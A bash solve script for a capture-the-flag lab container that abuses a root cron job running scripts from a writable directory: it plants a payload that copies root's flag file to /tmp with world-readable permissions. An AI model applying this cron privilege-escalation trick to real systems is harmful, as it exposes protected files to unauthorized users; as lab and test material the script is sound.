#!/usr/bin/env bash
set -euo pipefail

IMAGE="challenge9:latest"
CONTAINER="challenge9"

have_image() { docker image inspect "$IMAGE" >/dev/null 2>&1; }
have_container() { docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER}$"; }
is_running() { [ "$(docker inspect -f '{{.State.Status}}' "$CONTAINER")" = "running" ]; }

# Ensure image/container are ready
if ! have_image; then
  echo "[!] Image $IMAGE not found. Run ./build.sh first."
  exit 1
fi
if ! have_container; then
  echo "[i] Creating container (detached)…"
  docker run -d --name "$CONTAINER" "$IMAGE" \
    /bin/bash -lc "/usr/sbin/crond -l 8 -c /etc/crontabs; tail -f /dev/null"
elif ! is_running; then
  echo "[i] Starting existing container…"
  docker start "$CONTAINER" >/dev/null
fi

# Ensure crond is running and crontab entry exists
echo "[i] Verifying crond and crontab inside container..."
set +e
docker exec "$CONTAINER" /bin/sh -lc '
  mkdir -p /etc/crontabs
  touch /etc/crontabs/root
  if ! grep -q "/usr/local/bin/cleanup.sh" /etc/crontabs/root 2>/dev/null; then
    echo "* * * * * /bin/bash /usr/local/bin/cleanup.sh >> /var/log/cleanup.log 2>&1" >> /etc/crontabs/root
  fi
  chmod 600 /etc/crontabs/root 2>/dev/null || true

  # Force-start crond on the correct spool dir
  /usr/sbin/crond -l 8 -c /etc/crontabs

  # Confirm it is up (use pidof if present, else ps)
  if command -v pidof >/dev/null 2>&1; then
    pidof crond >/dev/null 2>&1 || exit 10
  else
    ps | grep -q "[c]rond" || exit 10
  fi
'
rc=$?; set -e
if [ $rc -ne 0 ]; then
  echo "[!] crond did not start (rc=$rc)."
fi
echo "[i] Cron verified."

# Payload to grab the flag
PAYLOAD=$(cat <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
cat /root/flag.txt > /tmp/flag.out
chmod 644 /tmp/flag.out
EOF
)

tmpfile="$(mktemp)"
printf '%s\n' "$PAYLOAD" > "$tmpfile"
chmod +x "$tmpfile"
docker cp "$tmpfile" "$CONTAINER":/var/cleanup/grabflag.sh
rm -f "$tmpfile"
echo "[i] Payload placed at /var/cleanup/grabflag.sh"

# Wait for cron (max ~120s)
echo "[i] Waiting for cron to run payload..."
for _ in $(seq 1 24); do
  if docker exec "$CONTAINER" test -f /tmp/flag.out; then
    echo "[i] Success! Flag:"
    docker exec "$CONTAINER" cat /tmp/flag.out
    exit 0
  fi
  sleep 5
done

# Debug + validation fallback
echo "[!] Timed out waiting for cron. Showing quick debug, then running one-shot cleanup for validation."
echo "---- /etc/crontabs/root ----"
docker exec "$CONTAINER" sh -lc 'cat /etc/crontabs/root || true'
echo "---- ps | grep crond ----"
docker exec "$CONTAINER" sh -lc 'ps | grep crond | grep -v grep || true'
echo "---- tail /var/log/cleanup.log ----"
docker exec "$CONTAINER" sh -lc 'tail -n 50 /var/log/cleanup.log || true'

# Validation-only fallback so CI never hangs:
docker exec "$CONTAINER" /bin/bash /usr/local/bin/cleanup.sh
echo "[i] Fallback executed. Flag:"
docker exec "$CONTAINER" cat /tmp/flag.out
